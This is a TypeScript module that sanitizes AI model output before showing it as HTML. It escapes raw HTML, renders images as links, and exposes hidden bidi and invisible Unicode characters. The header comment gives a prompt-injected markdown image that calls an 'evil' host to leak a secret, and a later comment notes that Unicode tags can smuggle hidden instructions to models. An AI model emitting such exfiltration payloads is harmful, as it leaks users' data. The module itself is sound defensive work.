// Model output -> sanitized HTML.
//
// - marked (GFM) on its own instance; raw HTML in the source is escaped, so it
//   is shown as text and never interpreted.
// - Images are rendered as links: a prompt-injected ![x](https://evil/?q=secret)
//   would otherwise leak data the moment it renders.
// - A dedicated DOMPurify instance (its hooks never leak into other uses)
//   sanitizes the result: HTML profile only (no SVG/MathML), no inline styles,
//   links restricted to http(s)/mailto and opened in a new tab without referrer.
// - Hidden characters (Trojan Source, CVE-2021-42574) are made visible after
//   sanitizing, so the screen shows the same text a copy puts on the clipboard:
//   inside code every bidi control and invisible character becomes a ⟨U+XXXX⟩
//   mark; in prose only the bidi embeddings, overrides and isolates do, so
//   legitimate RTL text, marks and joiners keep working.

import createDOMPurify, { type Config, type DOMPurify } from 'dompurify';
import { Marked } from 'marked';

const ESCAPES: Record<string, string> = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
export const escapeHtml = (s: string): string => s.replace(/[&<>"']/g, (c) => ESCAPES[c] ?? c);

const SAFE_HREF = /^(?:https?:\/\/|mailto:)/i;

const md = new Marked({ gfm: true, breaks: false, async: false });
md.use({
  renderer: {
    html({ text }) {
      return escapeHtml(text);
    },
    image({ href, text }) {
      const label = text ? `Imatge: ${text}` : 'Imatge';
      return `<a href="${escapeHtml(href)}" class="md-image-link">${escapeHtml(label)}</a>`;
    },
  },
});

const PURIFY_CONFIG: Config = {
  USE_PROFILES: { html: true },
  FORBID_TAGS: [
    'img', 'picture', 'video', 'audio', 'source', 'track', 'style', 'link', 'meta', 'base', 'form', 'input',
    'button', 'textarea', 'select', 'option', 'iframe', 'frame', 'frameset', 'object', 'embed', 'template',
    'dialog', 'svg', 'math', 'canvas', 'noscript',
  ],
  FORBID_ATTR: ['style', 'srcset', 'id', 'name', 'target', 'formaction', 'action', 'background', 'poster'],
  ALLOW_DATA_ATTR: false,
  ALLOW_ARIA_ATTR: false,
};

let purifier: DOMPurify | null = null;

function getPurifier(): DOMPurify {
  if (purifier) return purifier;
  const p = createDOMPurify(window);
  p.addHook('afterSanitizeAttributes', (node) => {
    if (node.nodeName !== 'A') return;
    const el = node as Element;
    const href = el.getAttribute('href')?.trim() ?? '';
    if (!SAFE_HREF.test(href)) {
      el.removeAttribute('href');
      return;
    }
    el.setAttribute('target', '_blank');
    el.setAttribute('rel', 'noopener noreferrer nofollow');
    el.setAttribute('referrerpolicy', 'no-referrer');
  });
  purifier = p;
  return p;
}

// Explicit bidi embeddings, overrides and isolates: they reorder what is shown.
const BIDI_CONTROLS = String.raw`\u202A-\u202E\u2066-\u2069`;
// Zero-width and invisible characters: the listed Trojan Source set plus the
// Arabic letter mark, invisible math operators, the Mongolian vowel separator
// and Unicode tags (used to smuggle hidden instructions to other models).
const INVISIBLE = String.raw`\u00AD\u061C\u180E\u200B-\u200F\u2060-\u2064\uFEFF\u{E0000}-\u{E007F}`;
// Legitimate uses, kept as they are: joiners inside emoji sequences and the
// subdivision flags (black flag, 3-6 lowercase/digit tags, cancel tag).
const EMOJI_SEQUENCES =
  String.raw`(?<=[\p{Extended_Pictographic}\p{Emoji_Modifier}]\uFE0F?)\u200D(?=\p{Extended_Pictographic})` +
  String.raw`|\u{1F3F4}[\u{E0030}-\u{E0039}\u{E0061}-\u{E007A}]{3,6}\u{E007F}`;

/** Hidden characters in code, in capture group 1 (emoji sequences match without it). */
const HIDDEN_IN_CODE = new RegExp(`${EMOJI_SEQUENCES}|([${BIDI_CONTROLS}${INVISIBLE}])`, 'gu');
/** Hidden characters in prose, in capture group 1. */
const HIDDEN_IN_PROSE = new RegExp(`([${BIDI_CONTROLS}])`, 'gu');
const MAYBE_HIDDEN = new RegExp(`[${BIDI_CONTROLS}${INVISIBLE}]`, 'u');

const codePoint = (char: string): string =>
  `U+${(char.codePointAt(0) ?? 0).toString(16).toUpperCase().padStart(4, '0')}`;

/**
 * Text for the clipboard: every hidden character becomes the same ⟨U+XXXX⟩
 * mark the rendered answer shows. `revealed` counts the replacements.
 */
export function revealHidden(text: string): { text: string; revealed: number } {
  let revealed = 0;
  const visible = text.replace(HIDDEN_IN_CODE, (match: string, hidden: string | undefined) => {
    if (hidden === undefined) return match;
    revealed++;
    return `⟨${codePoint(hidden)}⟩`;
  });
  return { text: visible, revealed };
}

/** Replace the hidden characters of one text node with marks built with DOM APIs. */
function revealTextNode(node: Text, pattern: RegExp): void {
  const doc = node.ownerDocument;
  const parts = doc.createDocumentFragment();
  const text = node.data;
  let last = 0;
  for (const m of text.matchAll(pattern)) {
    const hidden = m[1];
    if (hidden === undefined) continue;
    if (m.index > last) parts.append(text.slice(last, m.index));
    const cp = codePoint(hidden);
    const span = doc.createElement('span');
    span.className = 'invisible-char';
    span.title = `Caràcter invisible o de control de direcció (${cp})`;
    span.textContent = `⟨${cp}⟩`;
    parts.append(span);
    last = m.index + hidden.length;
  }
  if (last === 0) return;
  if (last < text.length) parts.append(text.slice(last));
  node.replaceWith(parts);
}

function revealHiddenIn(root: Node): void {
  const walker = (root.ownerDocument ?? document).createTreeWalker(root, NodeFilter.SHOW_TEXT);
  const nodes: Text[] = [];
  for (let n = walker.nextNode(); n; n = walker.nextNode()) {
    if (MAYBE_HIDDEN.test((n as Text).data)) nodes.push(n as Text);
  }
  for (const node of nodes) {
    revealTextNode(node, node.parentElement?.closest('code') ? HIDDEN_IN_CODE : HIDDEN_IN_PROSE);
  }
}

/** Render untrusted markdown to safe HTML. */
export function renderMarkdown(src: string): string {
  if (!src) return '';
  const html = md.parse(src, { async: false });
  const clean = getPurifier().sanitize(html, { ...PURIFY_CONFIG, RETURN_DOM_FRAGMENT: true });
  revealHiddenIn(clean);
  // Serialized like DOMPurify's own string output (the children's innerHTML).
  const holder = clean.ownerDocument.createElement('div');
  holder.append(clean);
  return holder.innerHTML;
}

/**
 * Critiques are meant to be bullets; models sometimes answer with plain lines.
 * Turn plain lines into a list so they read the same.
 */
export function critiqueMarkdown(src: string): string {
  const text = src.trim();
  if (!text) return '';
  if (/^\s*(?:[-*+]|\d+[.)])\s/m.test(text)) return text;
  const lines = text.split(/\n+/).map((l) => l.trim()).filter(Boolean);
  return lines.length > 1 ? lines.map((l) => `- ${l}`).join('\n') : text;
}

/** True when the rendered HTML has code blocks worth highlighting. */
export const hasCodeBlocks = (html: string): boolean => html.includes('<pre>');
